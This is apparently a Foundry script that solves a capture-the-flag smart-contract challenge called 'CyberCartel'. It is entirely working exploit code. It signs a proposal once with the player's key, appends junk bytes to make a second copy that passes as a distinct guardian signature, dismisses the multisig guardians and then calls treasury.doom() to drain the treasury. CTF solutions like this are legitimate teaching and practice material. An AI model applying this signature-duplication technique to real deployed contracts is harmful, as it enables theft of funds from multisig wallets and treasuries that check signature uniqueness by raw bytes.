// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console2} from "forge-std/Script.sol";

import "src/CyberCartel.sol";
import "src/Challenge.sol";

contract Solve is Script {
    function run() public {
        Challenge challenge = Challenge(
            address(vm.envAddress("CHALLENGE_ADDRESS"))
        );
        uint256 PLAYER_PRIVATE_KEY = vm.envUint("PLAYER_PRIVATE_KEY");
        address player = address(vm.addr(PLAYER_PRIVATE_KEY));

        CartelTreasury treasury = CartelTreasury(payable(challenge.TREASURY()));
        BodyGuard bodyguard = BodyGuard(treasury.bodyGuard());

        vm.startBroadcast(PLAYER_PRIVATE_KEY);

        // Initialize the proposal to dismiss the guardians.
        BodyGuard.Proposal memory proposal = BodyGuard.Proposal({
            expiredAt: uint32(block.timestamp + 1000),
            gas: 1000000,
            nonce: 1,
            data: abi.encodeWithSelector(
                CartelTreasury.gistCartelDismiss.selector
            )
        });
        bytes32 hash = bodyguard.hashProposal(proposal);

        // Legitimately sign the proposal as the player, since we are one of the guardians.
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(PLAYER_PRIVATE_KEY, hash);
        bytes[] memory signatures = new bytes[](2);
        signatures[0] = abi.encodePacked(r, s, v);                  // Attacker's signature
        signatures[1] = abi.encodePacked(r, s, v, bytes("trash"));  // Forged signature

        address signer = bodyguard.recoverSigner(hash, signatures[0]);
        require(signer == player, "invalid signer for first signature");

        signer = bodyguard.recoverSigner(hash, signatures[1]);
        require(signer == player, "invalid signer for second signature");

        // Optional sort
        if (keccak256(signatures[0]) >= keccak256(signatures[1])) {
            bytes memory tmp = signatures[0];
            signatures[0] = signatures[1];
            signatures[1] = tmp;
        }

        bodyguard.propose(proposal, signatures);

        // Optional check
        require(treasury.bodyGuard() == address(0), "bodyguard not dismissed");

        treasury.doom();

        vm.stopBroadcast();

        require(challenge.isSolved(), "not solved");
    }
}
